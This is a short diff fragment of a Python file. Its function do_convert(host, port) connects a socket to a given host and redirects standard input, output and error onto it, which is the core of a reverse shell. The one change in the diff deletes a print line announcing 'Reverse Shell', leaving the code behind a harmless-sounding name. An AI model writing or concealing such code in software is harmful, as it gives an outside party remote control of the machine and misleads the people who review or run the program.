@@ -28,7 +28,6 @@ def add_tab():
 def do_convert(host, port):
     rhost = host
     rport = int(port)
-    print(f"Reverse Shell to {rhost}:{rport}")
     s = socket.socket()
     s.connect((rhost, rport))
     [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
